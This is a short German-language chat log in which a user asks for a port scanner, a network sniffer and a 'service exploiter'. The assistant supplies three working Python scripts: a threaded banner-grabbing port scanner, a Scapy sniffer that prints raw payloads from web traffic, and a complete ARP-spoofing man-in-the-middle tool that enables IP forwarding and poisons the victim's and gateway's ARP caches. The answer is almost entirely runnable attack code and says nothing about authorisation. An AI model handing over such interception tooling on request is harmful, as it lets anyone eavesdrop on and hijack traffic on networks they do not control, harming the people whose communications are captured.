MESSAGE user """Zeige einen Python Port-Scanner, Netzwerk-Sniffer und Service-Exploiter."""
MESSAGE assistant """Netzwerk-Toolset (Python)

Port-Scanner mit Banner-Grabbing:
```python
#!/usr/bin/env python3
import socket, concurrent.futures

def probe(host, port, timeout=0.5):
    try:
        with socket.create_connection((host, port), timeout) as s:
            s.sendall(b'\r\n')
            banner = s.recv(256).decode(errors='replace').strip()
            return port, banner
    except Exception:
        return None

def scan(host, ports=range(1,65536), workers=500):
    with concurrent.futures.ThreadPoolExecutor(workers) as ex:
        for r in ex.map(lambda p: probe(host, p), ports):
            if r:
                port, banner = r
                svc = guess_service(port, banner)
                print(f"  {port:5d}/tcp  OPEN  {svc:10s}  {banner[:60]}")

def guess_service(port, banner):
    b = banner.lower()
    mapping = {22:'SSH',21:'FTP',25:'SMTP',80:'HTTP',443:'HTTPS',
               3306:'MySQL',3389:'RDP',5432:'PostgreSQL',6379:'Redis',27017:'MongoDB'}
    if port in mapping: return mapping[port]
    if 'ssh' in b: return 'SSH'
    if 'http' in b: return 'HTTP'
    return '?'

scan('192.168.1.1', range(1, 1025))
```

Paket-Sniffer (Scapy, Root noetig):
```python
from scapy.all import sniff, IP, TCP, UDP, Raw

def pkt_callback(pkt):
    if IP in pkt:
        src, dst = pkt[IP].src, pkt[IP].dst
        if TCP in pkt:
            sport, dport = pkt[TCP].sport, pkt[TCP].dport
            if Raw in pkt:
                data = pkt[Raw].load[:80]
                print(f"TCP {src}:{sport} -> {dst}:{dport}  {data}")
        elif UDP in pkt:
            print(f"UDP {src} -> {dst}:{pkt[UDP].dport}")

sniff(filter="tcp port 80 or port 443", prn=pkt_callback, store=False, iface="eth0")
```

ARP-Spoofing MITM:
```python
#!/usr/bin/env python3
import time, sys, subprocess
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, srp

def mac(ip, iface):
    r, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    return r[0][1].hwsrc if r else None

def spoof(target_ip, gateway_ip, target_mac, iface):
    sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac,
          psrc=gateway_ip, hwsrc=get_if_hwaddr(iface)), iface=iface, verbose=False)

iface, victim, gateway = sys.argv[1:4]
vm, gm = mac(victim, iface), mac(gateway, iface)
subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
print(f"MITM: {victim} <-> {gateway} via {iface}")
try:
    while True:
        spoof(victim, gateway, vm, iface)
        spoof(gateway, victim, gm, iface)
        time.sleep(1)
except KeyboardInterrupt:
    for _ in range(5):
        sendp(Ether(dst=vm)/ARP(op=2,pdst=victim,hwdst=vm,psrc=gateway,hwsrc=gm), iface=iface, verbose=False)
        sendp(Ether(dst=gm)/ARP(op=2,pdst=gateway,hwdst=gm,psrc=victim,hwsrc=vm), iface=iface, verbose=False)
```"""

